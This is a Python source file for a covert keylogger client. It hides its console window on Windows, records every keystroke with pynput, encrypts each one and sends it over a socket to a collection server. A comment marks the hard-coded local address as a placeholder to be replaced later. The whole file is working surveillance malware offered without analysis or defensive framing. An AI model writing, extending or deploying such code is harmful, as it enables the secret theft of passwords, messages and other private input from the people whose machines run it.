import socket
from pynput import keyboard
from cryptography.fernet import Fernet
import threading
import os
import platform
import ctypes

def hide_console():
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def on_press(key, client_socket, fernet):
    try:
        if hasattr(key, 'char') and key.char is not None:
            message = fernet.encrypt(key.char.encode())
        else:
            message = fernet.encrypt(f'{key}'.encode())

        client_socket.sendall(message)

    except Exception as e:
        print(f"Error sending key press: {e}")
        client_socket.close()
        return False

def start_keylogger_client():
    fernet = Fernet(Fernet.generate_key())

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Hard-coded server address for now; will replace later
    server_address = ("127.0.0.1", 65432)

    client_socket.connect(server_address)

    # Send the full encryption key to the server
    client_socket.sendall(fernet._encryption_key)

    if platform.system() == "Windows":
        hide_console()

    def listen_for_termination(client_socket, fernet):
        while True:
            try:
                encrypted_data = client_socket.recv(1024)
                data = fernet.decrypt(encrypted_data).decode()
                if data == 'terminate':
                    print("Termination signal received. Exiting...")
                    client_socket.close()
                    break
            except Exception as e:
                print(f"Error receiving termination signal: {e}")
                break

    termination_thread = threading.Thread(target=listen_for_termination, args=(client_socket, fernet))
    termination_thread.start()

    with keyboard.Listener(on_press=lambda key: on_press(key, client_socket, fernet)) as listener:
        listener.join()

if __name__ == '__main__':
    start_keylogger_client()
